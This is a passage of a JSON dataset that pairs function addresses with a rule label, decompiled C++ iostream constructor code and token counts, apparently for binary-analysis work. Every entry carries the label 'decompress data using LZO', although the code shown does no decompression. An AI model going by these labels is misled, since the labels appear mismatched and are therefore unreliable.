        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a2170(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.004bc380(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00499b30();\n    fcn.004bc380(in_ECX + 2);\n    iVar1 = fcn.00498500(arg_ch, arg_10h | 8);\n    if (iVar1 != 0) {\n        fcn.004bc500(0);\n        return;\n    }\n    fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 277
    },
    "004a2260": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a2260(int32_t *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.004bc380(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00499b30();\n    fcn.004bc380(in_ECX + 2);\n    iVar1 = fcn.00498500(*arg_ch, arg_10h | 8);\n    if (iVar1 != 0) {\n        fcn.004bc500(0);\n        return;\n    }\n    fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 279
    },
    "004a2350": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a2350(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.004bc380(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00499b30();\n    fcn.004bc380(in_ECX + 2);\n    return;\n}\n",
        "token_count": 188
    },
    "004a2750": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a2750(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    in_ECX[0x1f] = 0;\n    *(in_ECX + 0x20) = 0;\n    *(in_ECX + 0x82) = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    in_ECX[0x23] = 0;\n    in_ECX[0x24] = 0;\n    *in_ECX = 0x528060;\n    in_ECX[3] = 0x528074;\n    in_ECX[1] = 0;\n    fcn.004bc380(arg_8h);\n    in_ECX[2] = 0x528088;\n    in_ECX[3] = 0x52809c;\n    fcn.004bc380(arg_8h);\n    *in_ECX = 0x52c278;\n    in_ECX[3] = 0x52c2a0;\n    in_ECX[2] = 0x52c28c;\n    return;\n}\n",
        "token_count": 289
    },
    "004a2830": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.004a2830(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.004bad50();\n    param_1[0x1f] = 0;\n    *(param_1 + 0x20) = 0;\n    *(param_1 + 0x82) = 0;\n    param_1[0x21] = 0;\n    param_1[0x22] = 0;\n    param_1[0x23] = 0;\n    param_1[0x24] = 0;\n    *param_1 = 0x528060;\n    param_1[3] = 0x528074;\n    param_1[1] = 0;\n    fcn.004bc380(0);\n    param_1[2] = 0x528088;\n    param_1[3] = 0x52809c;\n    fcn.004bc380(0);\n    *param_1 = 0x52c278;\n    param_1[3] = 0x52c2a0;\n    param_1[2] = 0x52c28c;\n    return;\n}\n",
        "token_count": 278
    },
    "004a29c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a29c0(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.004bc380(arg_ch);\n    iVar1 = arg_8h[3];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[4];\n    fcn.004bc380(arg_ch);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[5];\n    in_ECX[2] = arg_8h[6];\n    return;\n}\n",
        "token_count": 243
    },
    "004a2a50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.004a2a50(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_8h;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.004bc380(0);\n    iVar1 = arg_8h[3];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[4];\n    fcn.004bc380(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[5];\n    in_ECX[2] = arg_8h[6];\n    return;\n}\n",
        "token_count": 243
    },
    "004a2df0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a2df0(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    int32_t iVar2;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *in_ECX = 0x5280b0;\n    *(in_ECX + 0x39) = 0;\n    iVar2 = *arg_8h;\n    in_ECX[0x38] = 0;\n    iVar2 = *(iVar2 + -0xc);\n    in_ECX[0x3a] = 0;\n    in_ECX[0x3b] = 0;\n    iVar2 = iVar2 + arg_8h;\n    in_ECX[0x1c] = 0x5280c4;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    fcn.004ba340(iVar2);\n    fcn.004bba60(in_ECX + 0x37);\n    uVar1 = *(iVar2 + 0x70);\n    *(iVar2 + 0x70) = 0;\n    in_ECX[0x38] = uVar1;\n    *(in_ECX + 0x39) = *(iVar2 + 0x74);\n    *(in_ECX + 0xe5) = *(iVar2 + 0x75);\n    in_ECX[0x3a] = 0;\n    *in_ECX = 0x52c2b4;\n    in_ECX[0x1c] = 0x52c2c8;\n    fcn.00497a20(arg_8h + 1);\n    in_ECX[0x3a] = in_ECX + 1;\n    return;\n}\n",
        "token_count": 427
    },
    "004a2f00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a2f00(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *in_ECX = 0x5280b0;\n    in_ECX[0x38] = 0;\n    *(in_ECX + 0x39) = 0;\n    in_ECX[0x3a] = 0;\n    in_ECX[0x3b] = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x1c] = 0x5280c4;\n    fcn.004bbb80(0);\n    *in_ECX = 0x52c2b4;\n    in_ECX[0x1c] = 0x52c2c8;\n    fcn.00497b60();\n    fcn.004bbb80(in_ECX + 1);\n    iVar1 = fcn.00496550(arg_8h, arg_ch | 0x10);\n    if (iVar1 != 0) {\n        fcn.004bbce0(0);\n        return;\n    }\n    fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 339
    },
    "004a3020": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a3020(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *in_ECX = 0x5280b0;\n    in_ECX[0x38] = 0;\n    *(in_ECX + 0x39) = 0;\n    in_ECX[0x3a] = 0;\n    in_ECX[0x3b] = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x1c] = 0x5280c4;\n    fcn.004bbb80(0);\n    *in_ECX = 0x52c2b4;\n    in_ECX[0x1c] = 0x52c2c8;\n    fcn.00497b60();\n    fcn.004bbb80(in_ECX + 1);\n    iVar1 = fcn.00496550(*arg_8h, arg_ch | 0x10);\n    if (iVar1 != 0) {\n        fcn.004bbce0(0);\n        return;\n    }\n    fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 340
    },
    "004a3140": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.004a3140(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.004bad50();\n    *param_1 = 0x5280b0;\n    param_1[0x38] = 0;\n    *(param_1 + 0x39) = 0;\n    param_1[0x3a] = 0;\n    param_1[0x3b] = 0;\n    param_1[0x3c] = 0;\n    param_1[0x3d] = 0;\n    param_1[0x1c] = 0x5280c4;\n    fcn.004bbb80(0);\n    *param_1 = 0x52c2b4;\n    param_1[0x1c] = 0x52c2c8;\n    fcn.00497b60();\n    fcn.004bbb80(param_1 + 1);\n    return;\n}\n",
        "token_count": 235
    },
    "004a3210": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a3210(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar2 = arg_8h[1];\n    *in_ECX = iVar2;\n    piVar4 = *(iVar2 + -0xc) + in_ECX;\n    *piVar4 = arg_8h[2];\n    iVar3 = *(*arg_ch + -0xc) + arg_ch;\n    fcn.004ba340(iVar3);\n    fcn.004bba60(piVar4 + 0x1b);\n    iVar2 = *(iVar3 + 0x70);\n    *(iVar3 + 0x70) = 0;\n    piVar4[0x1c] = iVar2;\n    *(piVar4 + 0x1d) = *(iVar3 + 0x74);\n    uVar1 = *(iVar3 + 0x75);\n    piVar4[0x1e] = 0;\n    *(piVar4 + 0x75) = uVar1;\n    iVar2 = *arg_8h;\n    *in_ECX = iVar2;\n    *(in_ECX + *(iVar2 + -0xc)) = arg_8h[3];\n    fcn.00497a20(arg_ch + 1);\n    *(in_ECX + *(*in_ECX + -0xc) + 0x78) = in_ECX + 1;\n    return;\n}\n",
        "token_count": 384
    },
    "004a32e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a32e0(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(*(iVar1 + -0xc) + in_ECX) = arg_8h[2];\n    fcn.004bbb80(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00497b60();\n    fcn.004bbb80(in_ECX + 1);\n    iVar1 = fcn.00496550(arg_ch, arg_10h | 0x10);\n    if (iVar1 != 0) {\n        fcn.004bbce0(0);\n        return;\n    }\n    fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 272
    },
    "004a33c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a33c0(int32_t *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(*(iVar1 + -0xc) + in_ECX) = arg_8h[2];\n    fcn.004bbb80(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00497b60();\n    fcn.004bbb80(in_ECX + 1);\n    iVar1 = fcn.00496550(*arg_ch, arg_10h | 0x10);\n    if (iVar1 != 0) {\n        fcn.004bbce0(0);\n        return;\n    }\n    fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 274
    },
    "004a34a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a34a0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(*(iVar1 + -0xc) + in_ECX) = arg_8h[2];\n    fcn.004bbb80(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00497b60();\n    fcn.004bbb80(in_ECX + 1);\n    return;\n}\n",
        "token_count": 179
    },
    "004a38a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a38a0(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    int32_t iVar2;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *in_ECX = 0x5280d8;\n    *(in_ECX + 0x3a) = 0;\n    iVar2 = *arg_8h;\n    in_ECX[0x39] = 0;\n    iVar2 = *(iVar2 + -0xc);\n    *(in_ECX + 0xea) = 0;\n    in_ECX[0x3b] = 0;\n    iVar2 = iVar2 + arg_8h;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x1d] = 0x5280ec;\n    fcn.004ba340(iVar2);\n    fcn.004bc290(in_ECX + 0x38);\n    uVar1 = *(iVar2 + 0x70);\n    *(iVar2 + 0x70) = 0;\n    in_ECX[0x39] = uVar1;\n    *(in_ECX + 0x3a) = *(iVar2 + 0x74);\n    *(in_ECX + 0xea) = *(iVar2 + 0x76);\n    in_ECX[0x3b] = 0;\n    *in_ECX = 0x52c2dc;\n    in_ECX[0x1d] = 0x52c2f0;\n    fcn.004999f0(arg_8h + 1);\n    in_ECX[0x3b] = in_ECX + 1;\n    return;\n}\n",
        "token_count": 439
    },
    "004a39c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a39c0(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *(in_ECX + 0xea) = 0;\n    in_ECX[0x39] = 0;\n    *(in_ECX + 0x3a) = 0;\n    in_ECX[0x3b] = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    *in_ECX = 0x5280d8;\n    in_ECX[0x1d] = 0x5280ec;\n    fcn.004bc380(0);\n    *in_ECX = 0x52c2dc;\n    in_ECX[0x1d] = 0x52c2f0;\n    fcn.00499b30();\n    fcn.004bc380(in_ECX + 1);\n    iVar1 = fcn.00498500(arg_8h, arg_ch | 0x10);\n    if (iVar1 != 0) {\n        fcn.004bc500(0);\n        return;\n    }\n    fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 350
    },
    "004a3af0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a3af0(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *(in_ECX + 0xea) = 0;\n    in_ECX[0x39] = 0;\n    *(in_ECX + 0x3a) = 0;\n    in_ECX[0x3b] = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    *in_ECX = 0x5280d8;\n    in_ECX[0x1d] = 0x5280ec;\n    fcn.004bc380(0);\n    *in_ECX = 0x52c2dc;\n    in_ECX[0x1d] = 0x52c2f0;\n    fcn.00499b30();\n    fcn.004bc380(in_ECX + 1);\n    iVar1 = fcn.00498500(*arg_8h, arg_ch | 0x10);\n    if (iVar1 != 0) {\n        fcn.004bc500(0);\n        return;\n    }\n    fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 352
    },
    "004a3c20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.004a3c20(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.004bad50();\n    *(param_1 + 0xea) = 0;\n    param_1[0x39] = 0;\n    *(param_1 + 0x3a) = 0;\n    param_1[0x3b] = 0;\n    param_1[0x3c] = 0;\n    param_1[0x3d] = 0;\n    param_1[0x3e] = 0;\n    *param_1 = 0x5280d8;\n    param_1[0x1d] = 0x5280ec;\n    fcn.004bc380(0);\n    *param_1 = 0x52c2dc;\n    param_1[0x1d] = 0x52c2f0;\n    fcn.00499b30();\n    fcn.004bc380(param_1 + 1);\n    return;\n}\n",
        "token_count": 249
    },
    "004a3d00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a3d00(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = arg_8h[1];\n    *in_ECX = iVar3;\n    piVar5 = *(iVar3 + -0xc) + in_ECX;\n    *piVar5 = arg_8h[2];\n    iVar4 = *(*arg_ch + -0xc) + arg_ch;\n    fcn.004ba340(iVar4);\n    fcn.004bc290(piVar5 + 0x1b);\n    iVar3 = *(iVar4 + 0x70);\n    *(iVar4 + 0x70) = 0;\n    piVar5[0x1c] = iVar3;\n    uVar2 = *(iVar4 + 0x74);\n    uVar1 = *(iVar4 + 0x76);\n    piVar5[0x1e] = 0;\n    *(piVar5 + 0x1d) = uVar2;\n    *(piVar5 + 0x76) = uVar1;\n    iVar3 = *arg_8h;\n    *in_ECX = iVar3;\n    *(in_ECX + *(iVar3 + -0xc)) = arg_8h[3];\n    fcn.004999f0(arg_ch + 1);\n    *(in_ECX + *(*in_ECX + -0xc) + 0x78) = in_ECX + 1;\n    return;\n}\n",
        "token_count": 399
    },
    "004a3dd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a3dd0(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(*(iVar1 + -0xc) + in_ECX) = arg_8h[2];\n    fcn.004bc380(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00499b30();\n    fcn.004bc380(in_ECX + 1);\n    iVar1 = fcn.00498500(arg_ch, arg_10h | 0x10);\n    if (iVar1 != 0) {\n        fcn.004bc500(0);\n        return;\n    }\n    fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 270
    },
    "004a3eb0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a3eb0(int32_t *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(*(iVar1 + -0xc) + in_ECX) = arg_8h[2];\n    fcn.004bc380(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00499b30();\n    fcn.004bc380(in_ECX + 1);\n    iVar1 = fcn.00498500(*arg_ch, arg_10h | 0x10);\n    if (iVar1 != 0) {\n        fcn.004bc500(0);\n        return;\n    }\n    fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 272
    },
    "004a3f90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a3f90(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(*(iVar1 + -0xc) + in_ECX) = arg_8h[2];\n    fcn.004bc380(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00499b30();\n    fcn.004bc380(in_ECX + 1);\n    return;\n}\n",
        "token_count": 179
    },
    "004a5170": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004a5170(uint *param_1, uint param_2)\n\n{\n    fcn.004a0d00(param_2);\n    *param_1 = 0x52c390;\n    return;\n}\n",
        "token_count": 54
    },
    "004a5900": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a5900(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint var_ch;\n    \n    fcn.004aebe0(arg_8h + 7);\n    if (*(*arg_8h + 8) != method.c_streambufIwSt11char_traitsIwEE.virtual_8) {\n        (**(*arg_8h + 8))(arg_ch);\n    }\n    fcn.004aed50(arg_ch);\n    return;\n}\n",
        "token_count": 122
    },
    "004a62a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a62a0(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint var_ch;\n    \n    fcn.004aebe0(arg_8h + 7);\n    if (*(*arg_8h + 8) != method.ages_bynameIcE.virtual_8) {\n        (**(*arg_8h + 8))(arg_ch);\n    }\n    fcn.004aed50(arg_ch);\n    return;\n}\n",
        "token_count": 118
    },
    "004a6a40": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a6a40(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x52cc1c;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.004bb160();\n    *in_ECX = 0x52c45c;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x524350;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = 0x524352;\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.004ae9c0();\n            fcn.004bb160();\n            fcn.004aea30(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 580
    },
    "004a6c10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004a6c10(uint8_t **arg_8h, int32_t arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    uint8_t *puStack76;\n    uint uStack72;\n    uint8_t *var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar2 = *arg_8h;\n    *in_ECX = 0x52cc1c;\n    in_ECX[2] = 0;\n    in_ECX[1] = arg_ch != 0;\n    puStack76 = NULL;\n    var_2ch = puVar2;\n    fcn.004bb160();\n    *in_ECX = 0x52c45c;\n    iVar1 = 2;\n    bVar4 = &puStack76 < 0x4;\n    bVar6 = *0x10 == 0x50;\n    puVar3 = 0x524350;\n    do {\n        if (iVar1 == 0) break;\n        iVar1 = iVar1 + -1;\n        bVar4 = *puVar2 < *puVar3;\n        bVar6 = *puVar2 == *puVar3;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    } while (bVar6);\n    bVar5 = false;\n    bVar4 = (!bVar4 && !bVar6) == bVar4;\n    if (!bVar4) {\n        iVar1 = 6;\n        puVar2 = var_2ch;\n        puVar3 = 0x524352;\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar5 = *puVar2 < *puVar3;\n            bVar4 = *puVar2 == *puVar3;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        } while (bVar4);\n        if ((!bVar5 && !bVar4) != bVar5) {\n            uStack72 = 0;\n            puStack76 = var_2ch;\n            fcn.004ae9c0();\n            fcn.004bb160();\n            fcn.004aea30(&var_1ch);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 580
    },
    "004a6e20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
